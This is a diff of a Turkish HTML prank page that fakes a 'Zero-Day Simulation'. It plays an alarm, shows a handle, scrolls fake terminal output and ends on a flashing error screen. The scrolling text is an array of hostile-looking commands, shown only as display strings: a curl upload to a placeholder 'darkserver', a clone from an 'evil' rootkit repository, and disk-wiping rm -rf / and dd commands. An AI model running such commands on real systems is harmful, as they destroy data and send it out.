@@ -1,72 +1,182 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Ses Erişimli X Butonu</title>
-<style>
-  body, html {
-    margin: 0; padding: 0; height: 100vh; background: #000; color: #0f0; font-family: monospace;
-    display: flex; justify-content: center; align-items: center;
-    overflow: hidden;
-  }
-  #xButton {
-    font-size: 5rem;
-    color: red;
-    cursor: pointer;
-    user-select: none;
-    background: transparent;
-    border: none;
-  }
-  #status {
-    position: fixed;
-    top: 1rem;
-    left: 50%;
-    transform: translateX(-50%);
-    color: #0f0;
-    font-size: 1.5rem;
-    user-select: none;
-  }
-</style>
+  <meta charset="UTF-8" />
+  <title>Zero-Day Simulation</title>
+  <style>
+    body {
+      margin:0; padding:0;
+      background:black; color:#0f0;
+      font-family:monospace;
+      overflow:hidden;
+    }
+    #startBtn {
+      position:fixed;
+      top:50%; left:50%;
+      transform:translate(-50%,-50%);
+      width:80px; height:80px;
+      font-size:48px;
+      color:red;
+      border:3px solid red;
+      background:black;
+      border-radius:50%;
+      cursor:pointer;
+      z-index:1000;
+      user-select:none;
+    }
+    #mhmtBox {
+      position:fixed;
+      top:50%; left:50%;
+      transform:translate(-50%,-50%);
+      font-size:32px;
+      color:#0f0;
+      border:2px solid #0f0;
+      padding:20px 40px;
+      display:none;
+      animation:blink 1s infinite;
+      z-index:999;
+      user-select:none;
+    }
+    @keyframes blink {
+      0%, 100% {opacity: 1;}
+      50% {opacity: 0.3;}
+    }
+    .terminal {
+      position:absolute;
+      width:90%;
+      height:40%;
+      padding:10px;
+      overflow:hidden;
+      background:black;
+      border:2px solid white;
+      font-size:16px;
+      white-space:pre-wrap;
+      display:none;
+      box-sizing:border-box;
+    }
+    #topTerm {top:0; left:5%; color:white;}
+    #bottomTerm {bottom:0; left:5%; color:#0f0;}
+    #errorScreen {
+      display:none;
+      position:fixed;
+      top:50%; left:50%;
+      transform:translate(-50%,-50%);
+      font-size:48px;
+      color:red;
+      animation:flash 0.5s infinite alternate;
+      z-index:9999;
+      user-select:none;
+    }
+    @keyframes flash {
+      0% {opacity: 1;}
+      100% {opacity: 0;}
+    }
+    .excl {
+      position:absolute;
+      color:red;
+      font-size:32px;
+      animation:flash 0.3s infinite;
+      z-index:9999;
+      user-select:none;
+    }
+  </style>
 </head>
 <body>
 
-<button id="xButton">✖</button>
-<div id="status"></div>
+<button id="startBtn">X</button>
+<div id="mhmtBox">@mhmtxaslan</div>
+<div id="topTerm" class="terminal"></div>
+<div id="bottomTerm" class="terminal"></div>
+<div id="errorScreen">!!! ERROR !!!</div>
+<audio id="alarm" loop>
+  <source src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg" type="audio/ogg" />
+</audio>
 
 <script>
-  const xButton = document.getElementById('xButton');
-  const status = document.getElementById('status');
+  const startBtn = document.getElementById("startBtn");
+  const mhmtBox = document.getElementById("mhmtBox");
+  const topTerm = document.getElementById("topTerm");
+  const bottomTerm = document.getElementById("bottomTerm");
+  const errorScreen = document.getElementById("errorScreen");
+  const alarm = document.getElementById("alarm");
 
-  // Örnek alarm sesi için küçük bir audio
-  const alarmAudio = new Audio('https://actions.google.com/sounds/v1/alarms/alarm_clock.ogg');
-  alarmAudio.loop = true;
+  const commands = [
+    "curl -X POST http://darkserver/upload",
+    "LongLongEarth.exe --deep-scan",
+    "sudo rm -rf / --no-preserve-root",
+    "ping 127.0.0.1 -t",
+    "nmap -sS 192.168.1.0/24",
+    "tracert 10.0.0.1",
+    "inject payload into memory",
+    "git clone http://evil.git/rootkit",
+    "dd if=/dev/random of=/dev/sda",
+    "echo HACKED > C:\\system32\\boot.ini"
+  ];
 
-  xButton.addEventListener('click', async () => {
+  startBtn.onclick = async () => {
     try {
-      // Kullanıcı etkileşimiyle ses oynatmayı dene
-      await alarmAudio.play();
+      await alarm.play();  // Kullanıcı tıklamasıyla ses oynatmayı başlat
 
-      // Butonu gizle
-      xButton.style.display = 'none';
-      status.textContent = "Ses oynatılıyor, animasyonlar başlıyor...";
+      // Ses erişimi sağlandı, butonu gizle ve efektleri başlat
+      startBtn.style.display = "none";
+      mhmtBox.style.display = "block";
 
-      // Burada diğer animasyonları tetikle (örnek: yazı fırtınası, terminal kutuları vs.)
-      startAnimations();
+      // 3. saniyede renk kırmızı oluyor
+      setTimeout(() => {
+        mhmtBox.style.color = "red";
+        mhmtBox.style.borderColor = "red";
+      }, 3000);
+
+      // 5. saniyede kutu kayboluyor ve terminaller başlıyor
+      setTimeout(() => {
+        mhmtBox.style.display = "none";
+        topTerm.style.display = "block";
+        bottomTerm.style.display = "block";
+        startTerminals();
+      }, 5000);
+
+      // 30. saniyede ERROR ekranı ve ünlemler
+      setTimeout(() => {
+        errorScreen.style.display = "block";
+        spawnExclamations(40);
+      }, 30000);
 
     } catch (err) {
-      status.textContent = "Ses oynatılamadı. Lütfen tarayıcı ayarlarını kontrol et.";
+      alert("Tarayıcınız ses oynatmayı engelliyor ya da izin vermediniz.");
       console.error(err);
     }
-  });
+  };
 
-  function startAnimations() {
-    // Buraya animasyon kodlarını ekle
-    console.log("Animasyonlar başlıyor...");
-    // Örnek: 3 saniye sonra mesaj
-    setTimeout(() => {
-      status.textContent = "Yazı fırtınası ve terminal kutuları başlatıldı.";
-    }, 3000);
+  function startTerminals() {
+    let count = 0;
+    const maxLines = 40;
+
+    const terminalInterval = setInterval(() => {
+      const cmd = commands[Math.floor(Math.random()*commands.length)];
+      const color = count > 20 ? "red" : "#0f0";
+
+      topTerm.innerHTML += `<div style="color:white;">${cmd}</div>`;
+      bottomTerm.innerHTML += `<div style="color:${color};">${cmd}</div>`;
+
+      topTerm.scrollTop = topTerm.scrollHeight;
+      bottomTerm.scrollTop = bottomTerm.scrollHeight;
+
+      count++;
+      if (count >= maxLines) {
+        clearInterval(terminalInterval);
+      }
+    }, 100);
+  }
+
+  function spawnExclamations(num) {
+    for (let i = 0; i < num; i++) {
+      const excl = document.createElement("div");
+      excl.classList.add("excl");
+      excl.textContent = "!";
+      excl.style.top = Math.random() * 100 + "vh";
+      excl.style.left = Math.random() * 100 + "vw";
+      document.body.appendChild(excl);
+    }
   }
 </script>
 
